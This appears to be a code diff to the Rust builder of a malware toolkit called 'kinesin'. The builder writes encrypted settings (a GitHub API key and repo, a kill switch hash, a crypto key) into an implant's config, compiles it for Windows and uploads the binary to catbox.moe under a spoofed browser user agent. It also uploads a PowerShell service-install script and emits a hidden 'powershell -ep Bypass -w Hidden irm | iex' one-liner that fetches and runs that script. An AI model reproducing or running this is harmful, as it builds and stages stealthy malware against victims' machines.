@@ -1,10 +1,15 @@
 mod utils;
 
-use std::{env, io, process};
-use std::fs::File;
-use std::io::{Read, Seek, SeekFrom, Write};
+use std::io::Write;
+use std::process::Command;
+use std::time::Duration;
+use std::{env, process, io};
+use std::fs::{self, File};
 use std::path::PathBuf;
 
+use reqwest::blocking::Client;
+use reqwest::blocking::multipart::{Form, Part};
+use reqwest::header::USER_AGENT;
 use serde::Deserialize;
 use json_comments::StripComments;
 
@@ -71,12 +76,13 @@ fn main() -> io::Result<()> {
     }
 
     let encryption_key_str = lib::random::gen_string(100);
+    let kill_switch_str = lib::random::gen_string(100);
+    let build_id_str = lib::random::gen_string(11);
+
     let encryption_key = lib::hash::sha256(encryption_key_str.as_bytes(), &[]);
-
-    let kill_switch = lib::random::gen_string(100);
-
     utils::set_key(&encryption_key);
 
+    let build_id = utils::encrypt(&build_id_str);
     let api_key = utils::encrypt(&config.api_key);
     let repo_name = utils::encrypt(&config.repo_name);
     let repo_owner = utils::encrypt(&config.repo_owner);
@@ -85,7 +91,7 @@ fn main() -> io::Result<()> {
     let log_file_name = utils::encrypt(&config.log_file_name);
     let base_directory = utils::encrypt(&config.base_directory);
 
-    let kill_switch_hash = lib::hash::sha256(kill_switch.as_bytes(), &encryption_key);
+    let kill_switch_hash = lib::hash::sha256(kill_switch_str.as_bytes(), &encryption_key);
 
     let kinesin_config_path = project_path.join("main\\src\\config.rs");
     if !kinesin_config_path.exists() || !kinesin_config_path.is_file() {
@@ -95,45 +101,159 @@ fn main() -> io::Result<()> {
 
     println!("kinesin config file - {}", kinesin_config_path.display());
 
-    let mut kinesin_config_file = File::options()
-        .read(true)
-        .write(true)
-        .open(kinesin_config_path)?;
+    let mut config_replace = fs::read_to_string(&kinesin_config_path)?;
+    utils::edit_array(&mut config_replace, "SERVICE_NAME", &service_name);
+    utils::edit_array(&mut config_replace, "LOG_FILE_NAME", &log_file_name);
+    utils::edit_array(&mut config_replace, "BASE_DIR_PATH", &base_directory);
+    utils::edit_array(&mut config_replace, "CRYPTO_KEY", &encryption_key);
+    utils::edit_array(&mut config_replace, "KILL_SWITCH_FILE_NAME", &kill_switch_file_name);
+    utils::edit_array(&mut config_replace, "KILL_SWITCH_HASH", &kill_switch_hash);
+    utils::edit_array(&mut config_replace, "GITHUB_API_KEY", &api_key);
+    utils::edit_array(&mut config_replace, "GITHUB_REPO", &repo_name);
+    utils::edit_array(&mut config_replace, "GITHUB_OWNER", &repo_owner);
+    utils::edit_array(&mut config_replace, "BUILD_ID", &build_id);
 
-    let mut to_replace = String::new();
-    kinesin_config_file.read_to_string(&mut to_replace)?;
+    fs::write(&kinesin_config_path, config_replace)?;
 
-    utils::edit_var(&mut to_replace, "SERVICE_NAME", &service_name);
-    utils::edit_var(&mut to_replace, "LOG_FILE_NAME", &log_file_name);
-    utils::edit_var(&mut to_replace, "BASE_DIR_PATH", &base_directory);
-    utils::edit_var(&mut to_replace, "CRYPTO_KEY", &encryption_key);
-    utils::edit_var(&mut to_replace, "KILL_SWITCH_FILE_NAME", &kill_switch_file_name);
-    utils::edit_var(&mut to_replace, "KILL_SWITCH_HASH", &kill_switch_hash);
-    utils::edit_var(&mut to_replace, "GITHUB_API_KEY", &api_key);
-    utils::edit_var(&mut to_replace, "GITHUB_REPO", &repo_name);
-    utils::edit_var(&mut to_replace, "GITHUB_OWNER", &repo_owner);
+    println!("updated config");
 
-    kinesin_config_file.set_len(0)?;
-    kinesin_config_file.seek(SeekFrom::Start(0))?;
-    kinesin_config_file.write_all(to_replace.as_bytes())?;
+    let main_path = project_path.join("main");
+    if !main_path.exists() || !main_path.is_dir() {
+        eprintln!("failed to find main directory {}", main_path.display());
+        process::exit(1);
+    }
 
-    println!("config has been updated");
+    println!("main directory - {}", main_path.display());
 
-    // compile
-    // upload
-    // write script
-    // upload
-    // write build data
+    let status = Command::new("cargo.exe")
+        .current_dir(&main_path)
+        .arg("build")
+        .arg("--release")
+        .arg("--target")
+        .arg("x86_64-pc-windows-msvc")
+        .status()?;
+
+    if !status.success() {
+        eprintln!("failed to compile main file");
+        process::exit(1);
+    }
+
+    println!("main built");
+
+    let main_file_path = main_path.join("target\\x86_64-pc-windows-msvc\\release\\main.exe");
+    if !main_file_path.exists() || !main_file_path.is_file() {
+        eprintln!("failed to find main file");
+        process::exit(1);
+    }
+
+    let main_url = upload_file(&main_file_path);
+    if main_url == "" {
+        eprintln!("failed to upload main file");
+        process::exit(1);
+    }
+
+    println!("main file uploaded");
+
+    let script_path = project_path.join("builder\\templates\\start-service.ps1");
+    if !script_path.exists() || !script_path.is_file() {
+        eprintln!("failed to find start service script");
+        process::exit(1);
+    }
+
+    let mut start_script = fs::read_to_string(&script_path)?;
+    utils::replace_str(&mut start_script, "BASE_DIR", &config.base_directory);
+    utils::replace_str(&mut start_script, "SERVICE_FILE_NAME", &config.service_file_name);
+    utils::replace_str(&mut start_script, "MAIN_FILE_URL", &main_url);
+    utils::replace_str(&mut start_script, "SERVICE_NAME", &config.service_name);
+
+    let temp_script = env::temp_dir()
+        .join(lib::random::gen_string(7));
+
+    fs::write(&temp_script, &start_script)?;
+
+    let script_url = upload_file(&temp_script);
+    if script_url == "" {
+        eprintln!("failed to upload script");
+        process::exit(1);
+    }
+
+    println!("script uploaded");
+
+    let builds_path = project_path.join("_build");
+    if !script_path.exists() {
+        fs::create_dir(&builds_path)?;
+    }
+
+    let build_data_file_name = builds_path
+        .join(format!("{}.txt", build_id_str));
+
+    let mut build_data_file = File::create(&build_data_file_name)?;
+    build_data_file.write_all(format!("powershell.exe -nop -ep Bypass -w Hidden -C \"irm {} | iex\"\n", script_url).as_bytes())?;
+    build_data_file.write_all("\n".as_bytes())?;
+    build_data_file.write_all("=============================================================================================\n".as_bytes())?;
+    build_data_file.write_all("=============================================================================================\n".as_bytes())?;
+    build_data_file.write_all("\n".as_bytes())?;
+    build_data_file.write_all(format!("encryption key: {}\n", encryption_key_str).as_bytes())?;
+    build_data_file.write_all(format!("kill switch: {}\n", kill_switch_str).as_bytes())?;
+    build_data_file.write_all("\n".as_bytes())?;
+    build_data_file.write_all(format!("main: {}\n", main_url).as_bytes())?;
+    build_data_file.write_all(format!("script: {}\n", script_url).as_bytes())?;
+    build_data_file.write_all("\n".as_bytes())?;
+    build_data_file.write_all(format!("{:#?}", config).as_bytes())?;
+
+    println!("build done - {}", build_data_file_name.display());
 
     Ok(())
 }
 
-fn finish_build() -> PathBuf {
-    PathBuf::new()
-}
+fn upload_file(file: &PathBuf) -> String {
+    let old_dir = file
+        .parent()
+        .unwrap();
 
-fn upload_file() -> String {
-    String::new()
+    let file_name = lib::random::gen_string(7);
+
+    let new_file = old_dir
+        .join(&file_name);
+
+    fs::rename(file, &new_file)
+        .unwrap();
+
+    let data = fs::read(&new_file)
+        .unwrap();
+
+    let parts = Part::bytes(data)
+        .file_name(format!("{}.txt", file_name))
+        .mime_str("text/plain")
+        .unwrap();
+
+    let form = Form::new()
+        .text("reqtype", "fileupload")
+        .part("fileToUpload", parts);
+
+    let client = Client::new();
+
+    let upload = client
+        .post("https://catbox.moe/user/api.php")
+        .header(USER_AGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0")
+        .timeout(Duration::from_secs(270))
+        .multipart(form)
+        .send()
+        .unwrap();
+
+    if !upload.status().is_success() {
+        return "".to_string();
+    }
+
+    let text = upload
+        .text()
+        .unwrap();
+
+    if !text.starts_with("https://") {
+        return "".to_string();
+    }
+
+    text
 }
 
 fn has_empty(config: &Config) -> bool {
